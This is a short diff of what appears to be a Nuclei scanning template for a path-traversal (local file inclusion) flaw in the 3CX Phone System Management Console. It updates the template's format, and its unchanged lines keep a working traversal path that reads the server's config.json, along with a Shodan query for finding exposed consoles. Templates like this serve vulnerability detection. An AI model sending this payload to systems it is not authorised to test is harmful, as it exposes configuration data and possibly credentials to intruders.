@@ -12,10 +12,11 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   metadata:
+    max-request: 2
     shoda-query: http.title:"3CX Phone System Management Console"
   tags: 3cx,lfi,voip
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json'
